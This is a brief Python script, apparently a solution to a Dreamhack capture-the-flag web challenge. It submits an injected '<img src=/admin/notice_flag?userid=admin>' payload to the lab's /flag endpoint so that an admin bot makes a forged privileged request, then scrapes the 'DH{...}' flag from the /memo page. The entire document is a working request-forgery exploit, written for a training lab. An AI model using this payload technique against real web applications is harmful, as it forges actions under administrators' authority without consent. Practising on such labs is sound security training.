import re
from requests import request as req

# /admin/notice_flag를 src로 하는 img 태그
param = "<img src=/admin/notice_flag?userid=admin>"
url = "http://host8.dreamhack.games:18030"

# /flag 요청
res_flag = req(
    method="POST",
    url=f"{url}/flag",
    data={"param": param},
)

if not res_flag.status_code == 200:
    raise Exception("ERROR")

# /memo 확인
res_memo = req(
    method="GET",
    url=f"{url}/memo",
)

# flag 필터링
match = re.search("DH{.*}", res_memo.text)

print(match.group() if match else "NO FLAG")
